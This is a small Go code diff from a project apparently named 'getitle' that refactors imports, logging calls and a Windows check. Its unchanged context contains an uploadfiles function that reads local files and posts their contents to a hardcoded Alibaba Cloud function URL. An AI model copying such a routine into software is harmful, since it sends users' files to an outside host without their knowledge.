@@ -4,8 +4,8 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"getitle/src/core"
-	. "getitle/src/structutils"
+	. "getitle/src/core"
+	"getitle/src/utils"
 	"io/ioutil"
 	"net"
 	"net/http"
@@ -48,7 +48,7 @@ func uploadfiles(filenames []string) {
 		}
 		content, err := ioutil.ReadFile(filename)
 		if err != nil {
-			core.ConsoleLog("[-] " + err.Error())
+			Log.Error(err.Error())
 			continue
 		}
 		_, err = http.Post("https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service.LATEST/ms/", "multipart/form-data", bytes.NewReader(content))
@@ -59,7 +59,7 @@ func uploadfiles(filenames []string) {
 }
 
 func attrib(filename string) bool {
-	if IsWin() {
+	if utils.Win {
 
 	}
 	return false
